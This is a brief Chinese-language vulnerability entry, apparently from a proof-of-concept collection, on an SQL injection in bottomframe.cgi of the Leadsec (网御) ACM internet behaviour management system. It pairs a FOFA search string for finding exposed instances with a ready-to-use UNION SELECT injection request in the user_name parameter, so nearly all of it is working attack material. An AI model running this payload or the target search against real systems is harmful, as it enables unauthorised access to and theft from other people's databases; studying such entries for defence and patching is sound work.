## 网御ACM上网行为管理系统bottomframe.cgi存在SQL注入漏洞

网御 ACM上网行为管理系统 bottomframe.cgi 存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感信息

## fofa

```
app="网御星云-上网行为管理系统"
```

## poc

```javascript
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409191348040.png)
